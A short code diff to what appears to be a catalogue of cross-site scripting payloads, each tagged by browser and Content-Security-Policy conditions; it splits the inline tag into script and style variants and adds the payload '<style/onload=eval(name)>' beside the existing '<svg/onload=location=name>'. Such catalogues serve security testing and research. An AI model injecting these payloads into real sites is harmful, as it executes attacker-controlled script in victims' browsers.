@@ -2,7 +2,8 @@ const TAGS = {
     chrome: 'chromium',
     firefox: 'firefox',
     safari: 'safari',
-    unsafeInline: 'unsafe-inline',
+    unsafeInline: 'script-unsafe-inline',
+    unsafeInlineStyle: 'style-unsafe-inline',
     unsafeEval: 'unsafe-eval',
     scripts: 'external-scripts',
     iframes: 'external-iframes',
@@ -66,6 +67,11 @@ const PAYLOADS = [
     {
         html: "<svg/onload=location=name>",
         tags: [TAGS.firefox, TAGS.unsafeInline, TAGS.controlsName],
+        author: null
+    },
+    {
+        html: "<style/onload=eval(name)>",
+        tags: [TAGS.chrome, TAGS.unsafeInlineStyle, TAGS.controlsName, TAGS.unsafeEval],
         author: null
     }
 ]
